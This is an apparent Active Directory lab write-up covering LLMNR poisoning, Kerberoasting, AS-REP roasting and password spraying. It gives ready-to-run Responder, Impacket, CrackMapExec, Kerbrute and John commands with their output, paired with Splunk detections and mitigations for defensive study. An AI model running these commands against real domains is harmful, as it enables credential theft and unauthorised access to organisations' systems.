# 🔐 Phase 3: Credential Access

This phase documents **Credential Access** techniques performed against a Windows Active Directory lab environment, with full attack walkthroughs and corresponding **Splunk detection queries** for each technique.

> **Lab Environment**
> | Role | Host | IP |
> |------|------|----|
> | Attacker | Kali Linux | 192.168.56.103 |
> | Domain Controller / Target | Windows Server 2019 (`WIN-11AN9QVN6Q3`) | 192.168.56.101 |
> | Victim Workstation | Windows 10 (`DESKTOP-71AV14L`) | 192.168.56.102 |
> | Domain | `exbugz0d.org` | — |

---

## 📋 Table of Contents

1. [LLMNR / NBT-NS Poisoning (Responder)](#1-llmnr--nbt-ns-poisoning-responder)
2. [Kerberoasting](#2-kerberoasting)
3. [AS-REP Roasting](#3-as-rep-roasting)
4. [Password Spraying](#4-password-spraying)
   - [4a. CrackMapExec over SMB](#4a-crackmapexec-over-smb)
   - [4b. Kerbrute over Kerberos](#4b-kerbrute-over-kerberos)
5. [Summary Table](#-summary-table)
6. [Mitigations](#-mitigations)

---

## 1. LLMNR / NBT-NS Poisoning (Responder)

### What Is It?

**Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are Windows fallback protocols used when DNS cannot resolve a hostname. When a Windows machine fails to resolve a name via DNS, it broadcasts an LLMNR/NBT-NS query to the entire local network segment.

An attacker listening on the same network can **respond to these broadcasts** (poisoning), tricking the victim into authenticating to the attacker's machine. This results in the attacker capturing an **NTLMv2 challenge-response hash**, which can then be cracked offline to recover the plaintext password.

### Attack Walkthrough

#### Step 1 — Trigger the Name Resolution Failure

The victim machine (`EXBUGZ0D\Administrator`) attempts to access a non-existent UNC path: `\\thisdoesnotexist\share`. DNS cannot resolve this hostname, so Windows falls back to LLMNR/NBT-NS broadcast.

> 📸 **Screenshot:** `screenshots/1-Share.png`

```
C:\Users\Administrator>\\thisdoesnotexist\share
Access is denied.
```

The "Access is denied" response actually comes **from Responder**, confirming the poisoning worked — the victim connected to the attacker's fake SMB server.

---

#### Step 2 — Capture the NTLMv2 Hash with Responder

The attacker runs **Responder** on Kali Linux, which listens on the network and answers LLMNR/NBT-NS queries with its own IP address, forcing the victim to authenticate:

```bash
responder -I eth0 -v
```

> 📸 **Screenshot:** `2- Capture.png`

Responder poisoned LLMNR and MDNS responses for the name `thisdoesnotexist`, intercepting authentication from both `192.168.56.101` and `192.168.56.102`. Three NTLMv2 hashes were captured for `EXBUGZ0D\Administrator`.

---

#### Step 3 — Retrieve the Hash from Responder Logs

Responder automatically saves all captured hashes under `/usr/share/responder/logs/`:

```bash
cd /usr/share/responder/logs
ls
cat SMB-NTLMv2-SSP-fe80::65cb:88fc:aa8d:4fe8.txt
```

> 📸 **Screenshot:** `3- Hash.png`

The file contains the full NTLMv2 hash strings for the `Administrator` account, in a format ready for offline cracking.

---

#### Step 4 — Crack the Hash with John the Ripper

```bash
john --format=netntlmv2 hash.txt --wordlist=passwords.txt
john --show --format=netntlmv2 hash.txt
```

> 📸 **Screenshot:** `4-_Crack.png`

```
Ahmedalsiddig123    (Administrator)
1 password hash cracked, 0 left
```

✅ **Cracked password:** `Ahmedalsiddig123` for the domain `Administrator` account.

---

### 🔍 Detection in Splunk

#### Detection 1 — Unusual NTLM Authentications (EventCode 4624 / 4776)

LLMNR poisoning forces NTLM authentication. Monitoring for NTLM logon events from unexpected source IPs — especially appearing in `Administrator` / `ANONYMOUS LOGON` pairs — is a key indicator.

```spl
index=wineventlog (EventCode=4624 OR EventCode=4776) Authentication_Package="NTLM"
| table _time host Account_Name src_ip Logon_Type Authentication_Package
```

> 📸 **Screenshot:** `5- Logs_01.png`

**17 events** were returned — all from `192.168.56.103`, all Logon Type **3** (network), alternating between `Administrator` and `ANONYMOUS LOGON`. This pairing pattern is characteristic of NTLM capture/relay: the SMB negotiation begins as anonymous, then the actual credential challenge follows.

---

#### Detection 2 — Sysmon DNS Query Failures (EventCode 22)

Sysmon Event ID **22** logs all DNS queries. The failed resolution that triggers LLMNR/NBT-NS broadcast appears here.

```spl
index=wineventlog EventCode=22
```

> 📸 **Screenshot:** `6- Logs_02.png`

654 Sysmon DNS events were found. Drilling into one of them:

> 📸 **Screenshot:** `7- Logs_03.png`

```
QueryName:    notFound
QueryStatus:  0
QueryResults: fe80::a00:27ff:fea8:357c;::ffff:192.168.56.103
Image:        C:\Windows\System32\svchost.exe
```

The `QueryResults` field resolves to `192.168.56.103` — the **attacker's machine** — confirming Responder answered the broadcast. The `QueryName: notFound` reflects the failed DNS lookup that initiated the LLMNR fallback.

---

## 2. Kerberoasting

### What Is It?

**Kerberoasting** exploits the Kerberos Ticket Granting Service (TGS). Any authenticated domain user can request a **TGS ticket** for any registered Service Principal Name (SPN) in the domain. The KDC returns a ticket encrypted with the **NTLM hash of the service account's password**. The attacker extracts this ticket and cracks it offline. If the service account uses a weak password, the plaintext is recovered without any direct interaction with the account.

### Attack Walkthrough

#### Step 1 — Request TGS Tickets for All SPNs

Using Impacket's `GetUserSPNs`, the attacker — already in possession of valid credentials (`ahmed:P@ssw0rd`) — requests all SPN tickets:

```bash
impacket-GetUserSPNs exbugz0d.org/ahmed:'P@ssw0rd' -dc-ip 192.168.56.101 -request
```

> 📸 **Screenshot:** `1- Kerberoasting_Attack.png`

| Field | Value |
|-------|-------|
| ServicePrincipalName | `mSSQLSvc/sql01.exbugz0d.org:1443` |
| Account | `ahmed` |
| MemberOf | `CN=Remote Desktop Users,CN=Builtin,DC=exbugz0d,DC=org` |
| PasswordLastSet | `2026-10-14 02:53:44` |

The extracted hash begins with `$krb5tgs$23$` — the **`$23$`** indicates **RC4-HMAC encryption (0x17)**, which is weak and can be cracked rapidly.

---

### 🔍 Detection in Splunk

#### Detection — RC4 TGS Requests (EventCode 4769 / 4768 with Ticket_Encryption_Type=0x17)

Kerberoasting generates a **TGS-REQ** event. The critical indicator is the encryption type **`0x17` (RC4-HMAC)** — legitimate modern environments use **AES (0x12 / 0x11)**. Any RC4 ticket request warrants investigation.

```spl
index=wineventlog EventCode=4768 Ticket_Encryption_Type=0x17
| stats count by Account_Name, Service_Name, Client_Address, _time
```

> 📸 **Screenshot:** `2- Kerberoasting_Logs.png`

**1 event matched:**

| Account_Name | Service_Name | Client_Address | _time |
|---|---|---|---|
| ahmed | krbtgt | ::ffff:192.168.56.103 | 2026-11-02 11:33:53 |

A single RC4 TGS request from an external IP is a strong signal. In production, alert on any `Ticket_Encryption_Type=0x17` where the service is not a legacy system known to require RC4.

---

## 3. AS-REP Roasting

### What Is It?

**AS-REP Roasting** targets domain accounts with **Kerberos Pre-Authentication disabled** (the `UF_DONT_REQUIRE_PREAUTH` flag). Normally, Kerberos pre-auth requires the client to prove identity before the KDC issues an AS-REP. Without it, an **unauthenticated** attacker can send an AS-REQ for any such account and receive an AS-REP encrypted with the user's password hash — without any prior credentials. The resulting `$krb5asrep$` hash is crackable offline.

### Attack Walkthrough

#### Step 1 — Enumerate and Request AS-REP Hashes

```bash
impacket-GetNPUsers exbugz0d.org/ -usersfile users.txt -dc-ip 192.168.56.101 -no-pass
```

> 📸 **Screenshot:** `1- AS-REP_Attack.png`

| Account | Result |
|---------|--------|
| `ahmed` | ✅ **Vulnerable** — `$krb5asrep$23$` hash returned |
| `Administrator` | ⚠️ Pre-auth required (not vulnerable) |
| `zaytoona` | ⚠️ Pre-auth required (not vulnerable) |
| One account | ⚠️ `KDC_ERR_KEY_EXPIRED` — password expired |
| Most others | ❌ `KDC_ERR_C_PRINCIPAL_UNKNOWN` — users don't exist |

The `$krb5asrep$23$` prefix again indicates RC4 encryption, making `ahmed`'s hash rapidly crackable with Hashcat or John the Ripper.

---

### 🔍 Detection in Splunk

#### Detection 1 — Username Enumeration Burst (EventCode 4768 Failures)

Each non-existent username generates a **4768 failure** event. A burst of these from a single source IP within milliseconds of each other is a clear sign of automated enumeration.

```spl
index=wineventlog EventCode=4768 Pre_Authentication_Type="-"
| table _time src_ip Account_Name action
```

> 📸 **Screenshot:** `2- Failures_Logs.png`

**49 failure events** — all from `::ffff:192.168.56.103`, all within a ~1-second window. Usernames tried: `abulhamed`, `gatada`, `sadeg`, `mohamed`, `dollar`, `noor`, `mazen`, `kola`, `hussam`, `abdullah`, `momen`, `ali`, `root`, and more. The machine-gun timing (millisecond gaps between events) is a definitive indicator of automation.

---

#### Detection 2 — Successful AS-REP Issued for Vulnerable Account (EventCode 4768)

After confirming a vulnerable account, pivot to look for the successful AS-REP:

```spl
index=wineventlog EventCode=4768 src_ip="192.168.56.103" action="success"
| table _time src_ip Account_Name action
```

> 📸 **Screenshot:** `3- Successes_Logs.png`

**4 success events** for user `ahmed` from `192.168.56.103` — confirming AS-REP hashes were successfully issued. Correlating these successes against the failure burst confirms the full enumeration-to-extraction sequence.

---

## 4. Password Spraying

### What Is It?

**Password spraying** tries a **single common password** against **many accounts**, rather than many passwords against one account. This avoids triggering account lockout policies (which lock after N failed attempts *per account*). Two protocols were used in this phase:

- **SMB** via CrackMapExec — authenticates against Windows SMB (port 445)
- **Kerberos** via Kerbrute — authenticates against the Kerberos KDC (port 88)

---

### 4a. CrackMapExec over SMB

#### Step 1 — Run the SMB Password Spray

```bash
crackmapexec smb 192.168.56.101 -u users.txt -p 'P@ssw0rd' --continue-on-success
```

> 📸 **Screenshot:** `1- Crackmapexec_Attack.png`

| Account | Result |
|---------|--------|
| `ahmed` | ✅ **Valid login** — `exbugz0d.org\ahmed:P@ssw0rd` |
| `momen` | ⚠️ `STATUS_PASSWORD_MUST_CHANGE` |
| `zaytoona` | ⚠️ `STATUS_PASSWORD_MUST_CHANGE` |
| All others | ❌ `STATUS_LOGON_FAILURE` |

16 accounts were tested in a single sweep. CrackMapExec's `--continue-on-success` flag ensures the spray doesn't stop at the first hit, mapping out all accounts sharing the same password.

---

### 🔍 Detection in Splunk

#### Detection 1 — Spray Pattern: Many Users, One IP, Short Window (EventCode 4625)

The spray's signature is **many distinct accounts failing from one IP in a short time span**, which stands out when you bin time and count unique usernames:

```spl
index=wineventlog EventCode=4625 Logon_Type=3
| bin _time span=2m
| stats dc(Account_Name) as Distinct_Users, count as Attempts, values(Account_Name) as Users_Tried by src_ip, _time
| where Distinct_Users > 5
| sort -Distinct_Users
```

> 📸 **Screenshot:** `2-SMB_Failed_Logon.png`

**1 statistical result:**

| src_ip | _time | Distinct_Users | Attempts | Users_Tried |
|--------|-------|---------------|----------|-------------|
| 192.168.56.103 | 2026-11-02 19:16:00 | 16 | 15 | Administrator, abdullah, abulhamed, ali, dollar, gatada, hussam, kola, mazen, mohamed, momen, noor, root, sadeg, zaytoona |

16 distinct users attempted from a single IP in a 2-minute window — a textbook password spray signature.

---

#### Detection 2 — Successful Login After Spray (EventCode 4624)

After identifying a spray, pivot to find which account the attacker logged in as:

```spl
index=wineventlog EventCode=4624 Logon_Type=3 src_ip="192.168.56.103"
| table _time Account_Name action
```

> 📸 **Screenshot:** `3- SMB_Success_Logon.png`

**2 events at 2026-11-02 19:17:49** — `ANONYMOUS LOGON` (SMB session negotiation) followed immediately by `ahmed` (authenticated session). The timestamp correlation between the spray failures and this success confirms `ahmed` was compromised.

---

### 4b. Kerbrute over Kerberos

#### Step 1 — Run the Kerberos Password Spray

```bash
kerbrute passwordspray -d exbugz0d.org --dc 192.168.56.101 users.txt 'P@ssw0rd'
```

> 📸 **Screenshot:** `4- Kerbrute_Attack.png`

```
[+] VALID LOGIN WITH ERROR:   zaytoona@exbugz0d.org:P@ssw0rd   (User's password has expired)
[+] VALID LOGIN WITH ERROR:   momen@exbugz0d.org:P@ssw0rd      (User's password has expired)
[+] VALID LOGIN:              ahmed@exbugz0d.org:P@ssw0rd

Done! Tested 16 logins (3 successes) in 0.107 seconds
```

Kerbrute validates credentials directly against the KDC without generating **Windows logon events (4624/4625)** in the same way as SMB — it only generates **Kerberos AS-REQ events (4768)**. This can bypass detections that rely solely on Windows logon event codes.

---

### 🔍 Detection in Splunk

#### Detection — Kerberos AS-REQ Burst: Many Usernames per Minute (EventCode 4768)

Kerbrute generates an AS-REQ for each user. Binning by 1-minute windows and counting distinct Account_Names per source IP reveals the spray:

```spl
index=wineventlog EventCode=4768
| bin _time span=1m
| stats dc(Account_Name) as usernames_tried, count by src_ip, _time
| where usernames_tried > 10
```

> 📸 **Screenshot:** `5- Kerb_Logs.png`

**1 result:**

| src_ip | _time | usernames_tried | count |
|--------|-------|----------------|-------|
| 192.168.56.103 | 2026-11-02 18:11:00 | **15** | 15 |

15 distinct usernames sent in a single 1-minute window from one IP — definitively identifying the Kerbrute spray. The threshold of `> 10` usernames/minute is an effective detection floor that avoids false positives from normal authentication patterns.

---

## 📊 Summary Table

| # | Attack | Tool | Protocol/Port | Key Event Codes | Detection Indicator |
|---|--------|------|---------------|-----------------|---------------------|
| 1 | LLMNR/NBT-NS Poisoning | Responder | SMB / LLMNR | 4624, 4776, Sysmon 22 | NTLM auth from unexpected IP; DNS query resolving to attacker IP |
| 2 | Kerberoasting | impacket-GetUserSPNs | Kerberos / 88 | 4769, 4768 | `Ticket_Encryption_Type=0x17` (RC4) TGS request |
| 3 | AS-REP Roasting | impacket-GetNPUsers | Kerberos / 88 | 4768 | Burst of 4768 failures (username enum) + success for vulnerable account |
| 4a | Password Spray (SMB) | CrackMapExec | SMB / 445 | 4625, 4624 | Many distinct users, same source IP, short time window |
| 4b | Password Spray (Kerberos) | Kerbrute | Kerberos / 88 | 4768 | >10 distinct usernames/min from single IP via AS-REQ |

---

## 🛡️ Mitigations

| Attack | Mitigation |
|--------|-----------|
| LLMNR/NBT-NS Poisoning | Disable LLMNR via GPO (`Computer Configuration > Administrative Templates > Network > DNS Client`) and disable NBT-NS in NIC settings. Enable SMB signing to prevent relay. |
| Kerberoasting | Use **gMSA (Group Managed Service Accounts)** with auto-rotating 120-character passwords. Enforce AES encryption for Kerberos; disable RC4/DES. Audit SPNs regularly. |
| AS-REP Roasting | Enable **Kerberos Pre-Authentication** on all accounts. Audit for `UF_DONT_REQUIRE_PREAUTH` using: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`. |
| Password Spraying | Enforce strong password policies (12+ chars, complexity). Enable **Azure AD Smart Lockout** or on-prem lockout. Implement **MFA**. Monitor for 4625/4768 spray patterns. |
| All | Deploy and tune **Splunk alerts** on the detection queries above. Segment network to limit lateral movement after initial compromise. |

---

## 🗂️ Tools Used

| Tool | Purpose |
|------|---------|
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS poisoning & NTLMv2 hash capture |
| [John the Ripper](https://www.openwall.com/john/) | Offline NTLMv2 hash cracking |
| [Impacket - GetUserSPNs](https://github.com/fortra/impacket) | Kerberoasting — TGS ticket extraction |
| [Impacket - GetNPUsers](https://github.com/fortra/impacket) | AS-REP Roasting — hash extraction |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) | SMB password spraying |
| [Kerbrute](https://github.com/ropnop/kerbrute) | Kerberos password spraying |
| [Splunk Enterprise](https://www.splunk.com) | Log ingestion, SIEM detection & analysis |

---

> **⚠️ Disclaimer:** This lab is conducted in a controlled, isolated environment for educational and defensive security research purposes only. All techniques documented here are performed on systems owned by the researcher.
